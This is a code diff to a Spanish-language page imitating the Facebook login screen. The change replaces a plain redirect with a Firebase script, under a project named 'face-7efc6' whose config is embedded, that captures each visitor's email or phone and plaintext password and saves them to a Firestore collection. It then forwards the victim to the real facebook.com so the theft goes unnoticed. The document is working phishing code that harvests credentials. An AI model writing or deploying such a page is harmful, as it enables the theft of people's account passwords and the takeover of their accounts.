@@ -134,7 +134,7 @@
       <form id="login-form">
         <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
         <input type="password" id="password" placeholder="Contraseña" required>
-        <button type="button" class="login-button">Iniciar sesión</button>
+        <button type="submit" class="login-button">Iniciar sesión</button>
         <div class="forgot-password">
           <a href="#">¿Olvidaste tu contraseña?</a>
         </div>
@@ -145,10 +145,46 @@
   </div>
 </div>
 
-<script>
-  // Redirigir al hacer clic en el botón "Iniciar sesión"
-  document.querySelector('.login-button').addEventListener('click', function() {
-    window.location.href = "https://www.facebook.com";
+<script type="module">
+  // Import Firebase
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+
+  // Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyA-okgbyWo2fSd41521MGYrRdwE8Kj8UDY",
+    authDomain: "face-7efc6.firebaseapp.com",
+    projectId: "face-7efc6",
+    storageBucket: "face-7efc6.firebasestorage.app",
+    messagingSenderId: "1035061315837",
+    appId: "1:1035061315837:web:74509849ccb74ef7a61694"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  // Handle form submission
+  document.getElementById('login-form').addEventListener('submit', async (e) => {
+    e.preventDefault(); // Prevent default form submission
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    try {
+      // Save to Firestore
+      await addDoc(collection(db, "users"), {
+        email,
+        password,
+        createdAt: serverTimestamp()
+      });
+      alert("Datos guardados exitosamente.");
+      // Redirect to Facebook
+      window.location.href = "https://www.facebook.com";
+    } catch (error) {
+      console.error("Error al guardar los datos:", error);
+      alert("Hubo un error al guardar los datos.");
+    }
   });
 </script>
 
